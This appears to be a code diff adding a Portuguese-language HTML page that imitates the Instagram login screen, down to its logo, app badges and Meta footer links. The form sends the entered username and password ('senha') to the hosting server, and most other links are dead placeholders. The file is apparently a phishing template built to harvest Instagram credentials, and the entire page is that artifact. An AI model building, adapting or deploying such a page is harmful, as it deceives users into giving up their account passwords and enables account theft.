@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          Helvetica, Arial, sans-serif;
+      }
+
+      body {
+        background-color: #000;
+        color: #fff;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+        justify-content: space-between;
+      }
+
+      .container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 32px 16px;
+        flex-grow: 1;
+      }
+
+      .div__banner {
+        display: flex;
+        align-items: center;
+      }
+
+      .div__banner .banner {
+        width: 500px;
+      }
+
+      .login-container {
+        display: flex;
+        max-width: 935px;
+        width: 100%;
+        justify-content: center;
+        gap: 5rem;
+      }
+
+      .login-form {
+        width: 350px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .login-form form {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .instagram-logo {
+        font-size: 42px;
+        font-family: "Brush Script MT", cursive;
+        margin-bottom: 36px;
+      }
+
+      .form-input {
+        width: 80%;
+        margin-bottom: -12px;
+      }
+
+      .form-input input {
+        width: 100%;
+        background-color: #121212;
+        border: 1px solid #333;
+        border-radius: 4px;
+        padding: 12px;
+        color: #fff;
+      }
+
+      .form-input input::placeholder {
+        color: #8e8e8e;
+      }
+
+      .login-button {
+        width: 80%;
+        background-color: #0095f6;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        padding: 9px;
+        margin-top: 5px;
+        font-weight: bold;
+        cursor: pointer;
+      }
+
+      .divider {
+        display: flex;
+        align-items: center;
+        width: 80%;
+        margin: 20px 0;
+      }
+
+      .divider-line {
+        flex-grow: 1;
+        height: 1px;
+        background-color: #333;
+      }
+
+      .divider-text {
+        padding: 0 18px;
+        color: #8e8e8e;
+        font-size: 14px;
+      }
+
+      .facebook-login {
+        display: flex;
+        align-items: center;
+        color: #385185;
+        font-weight: 600;
+        margin: 8px 0;
+        text-decoration: none;
+      }
+
+      .facebook-login img {
+        width: 20px;
+        height: 20px;
+        margin-right: 8px;
+      }
+
+      .forgot-password {
+        color: #78c9ff;
+        font-size: 14px;
+        margin: 20px 0;
+        text-decoration: none;
+      }
+
+      .signup-section {
+        margin-top: 20px;
+        text-align: center;
+        font-size: 14px;
+      }
+
+      .signup-link {
+        color: #0095f6;
+        font-weight: 600;
+        text-decoration: none;
+      }
+
+      .get-app {
+        margin-top: 20px;
+        text-align: center;
+      }
+
+      .get-app p {
+        margin-top: 30px;
+      }
+
+      .app-download {
+        display: flex;
+        justify-content: center;
+        margin-top: 20px;
+      }
+
+      .app-download a {
+        margin: 0 4px;
+      }
+
+      .app-download img {
+        height: 40px;
+      }
+
+      .reaction-bubble {
+        position: absolute;
+        background-color: #fff;
+        border-radius: 20px;
+        padding: 8px 12px;
+        display: flex;
+        align-items: center;
+        z-index: 4;
+      }
+
+      .footer {
+        padding: 20px 16px;
+        text-align: center;
+      }
+
+      .footer-links {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        margin-bottom: 16px;
+      }
+
+      .footer-link {
+        color: #8e8e8e;
+        font-size: 12px;
+        margin: 0 8px 8px 8px;
+        text-decoration: none;
+      }
+
+      .language-selector {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 16px;
+      }
+
+      .language-selector select {
+        background-color: transparent;
+        border: none;
+        color: #8e8e8e;
+        font-size: 12px;
+        margin-right: 4px;
+      }
+
+      .copyright {
+        color: #8e8e8e;
+        font-size: 12px;
+      }
+
+      @media screen and (max-width: 800px) {
+        .login-container {
+          align-items: center;
+          flex-direction: column;
+          padding: 50px 16px 32px 16px;
+        }
+
+        .login-container .div__banner {
+          display: none;
+        }
+
+        .instagram-logo {
+          font-size: 3.6em;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="login-container">
+        <div class="div__banner">
+          <img
+            class="banner"
+            src="/static/insta/banner.png"
+            alt="Instagram Banner"
+          />
+        </div>
+
+        <div class="login-form">
+          <div class="instagram-logo">Instagram</div>
+          <form method="POST">
+            <div class="form-input">
+              <input
+                type="text"
+                name="email"
+                placeholder="Telefone, nome de usuário ou email"
+                required
+              />
+            </div>
+            <br />
+
+            <div class="form-input">
+              <input
+                type="password"
+                name="senha"
+                placeholder="Senha"
+                required
+              />
+            </div>
+            <br />
+            <button class="login-button" type="submit">Entrar</button>
+          </form>
+
+          <div class="divider">
+            <div class="divider-line"></div>
+            <div class="divider-text">OU</div>
+            <div class="divider-line"></div>
+          </div>
+
+          <a href="#" class="facebook-login">
+            <span style="color: #1877f2; font-size: 18px">f</span>
+            <span style="color: #1877f2; margin-left: 8px"
+              >Entrar com o Facebook</span
+            >
+          </a>
+
+          <a href="#" class="forgot-password">Esqueceu a senha?</a>
+
+          <div class="signup-section">
+            Não tem uma conta? <a href="#" class="signup-link">Cadastre-se</a>
+          </div>
+
+          <div class="get-app">
+            <p>Obtenha o aplicativo.</p>
+            <div class="app-download">
+              <a
+                href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D055402F2-5FA8-45C9-97B0-B888C820460C%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge"
+              >
+                <img class="banner" src="/static/insta/GooglePlay.png" />
+              </a>
+              <a
+                href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1366%2C720"
+              >
+                <img class="banner" src="/static/insta/Microsoft.png" />
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+      <div class="footer-links">
+        <a href="https://about.meta.com/" class="footer-link">Meta</a>
+        <a href="https://about.instagram.com/" class="footer-link">Sobre</a>
+        <a href="https://about.instagram.com/blog/" class="footer-link">Blog</a>
+        <a
+          href="https://about.instagram.com/about-us/careers"
+          class="footer-link"
+          >Carreiras</a
+        >
+        <a href="https://help.instagram.com/" class="footer-link">Ajuda</a>
+        <a
+          href="https://developers.facebook.com/docs/instagram"
+          class="footer-link"
+          >API</a
+        >
+        <a href="https://www.instagram.com/legal/privacy/" class="footer-link"
+          >Privacidade</a
+        >
+        <a href="https://www.instagram.com/legal/terms/" class="footer-link"
+          >Termos</a
+        >
+        <a
+          href="https://www.instagram.com/explore/locations/"
+          class="footer-link"
+          >Localizações</a
+        >
+        <a href="https://www.instagram.com/web/lite/" class="footer-link"
+          >Instagram Lite</a
+        >
+        <a href="https://www.threads.com/" class="footer-link">Threads</a>
+        <a
+          href="https://www.facebook.com/help/instagram/261704639352628"
+          class="footer-link"
+          >Upload de contatos e não usuários</a
+        >
+        <a
+          href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer"
+          class="footer-link"
+          >Meta Verified</a
+        >
+      </div>
+
+      <div class="language-selector">
+        <select>
+          <option value="pt_BR">Português (Brasil)</option>
+          <option value="en_US">English</option>
+          <option value="es_LA">Español</option>
+        </select>
+        <span class="copyright">© 2025 Instagram from Meta</span>
+      </div>
+    </footer>
+  </body>
+</html>
